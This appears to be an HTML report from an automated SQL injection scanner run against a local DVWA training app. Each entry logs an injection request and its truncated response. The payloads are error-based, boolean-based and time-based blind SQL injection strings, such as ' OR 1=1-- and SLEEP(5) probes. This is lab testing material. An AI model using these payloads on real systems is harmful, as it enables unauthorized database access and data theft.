+</div><hr><h3>Test ID: ERROR_MEDIUM_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.948169<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=1&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=63
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: ERROR_MEDIUM_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:30.987704<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=CONVERT(int, (SELECT @@version))--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=62
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: ERROR_MEDIUM_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.034216<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:30 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=61
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: ERROR_MEDIUM_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.082263<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=60
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: ERROR_MEDIUM_5</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.129839<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 'a'='a&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=59
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_TRUE_MEDIUM_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.174833<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=58
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_TRUE_MEDIUM_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.223618<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 'a'='a&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=57
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_TRUE_MEDIUM_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.270648<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=1--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=56
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_FALSE_MEDIUM_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.315948<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 1=2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=55
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_FALSE_MEDIUM_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.362198<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND 'a'='b&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=54
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: BOOL_FALSE_MEDIUM_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.410967<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR 1=2--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=53
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: TIME_MEDIUM_1</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.453258<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=52
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: TIME_MEDIUM_2</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.500479<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=51
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: TIME_MEDIUM_3</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.546458<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND IF(1=1, SLEEP(5), 0)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=50
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
+</div><hr><h3>Test ID: TIME_MEDIUM_4</h3><p><b>Timestamp:</b> 2025-07-18T22:12:31.593226<br><b>URL:</b> http://localhost/dvwa/vulnerabilities/sqli/<br><b>Method:</b> GET</p><h4>Request</h4><div class='code'>GET http://localhost/dvwa/vulnerabilities/sqli/?id=1' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--&Submit=Submit HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+</div><h4>Response</h4><div class='code'>HTTP/1.1 200
+Date: Fri, 18 Jul 2025 15:12:31 GMT
+Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2
+X-Powered-By: PHP/8.1.2
+Expires: Tue, 23 Jun 2009 12:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 4697
+Keep-Alive: timeout=5, max=49
+Connection: Keep-Alive
+Content-Type: text/html;charset=utf-8
+
+<!DOCTYPE html>
+
+<html lang="en-GB">
+
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+		<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA)</title>
+
+		<link rel="stylesheet" type="text/css" href="../../dvwa/css/main.css" />
+
+		<link rel="icon" type="\image/ico" href="../../favicon.ico" />
+
+		<script type="text/javascript" src="../../dvwa/js/dvwaPage.js"></script>
+
+	</head>
+
+	<body class="home light">
+		<div id="container">
+
+			<div id="header">
+
+				<img src="../../dvwa/images/logo.png" alt="Damn Vulnerable Web Application" />
+                <a href="#" onclick="javascript:toggleTheme();" class="theme-icon" title="Toggle theme between light and dark.">
+                    <img src="../../dvwa/images/theme-light-dark.png" alt="Damn Vulnerable Web Application" />
+                </a>
+			</div>
+
+			<div id="main_menu">
+
+				<div id="main_menu_padded">
+				<ul class="menuBlocks"><li class=""><a href="../../.">Home</a></li>
+<li cla...
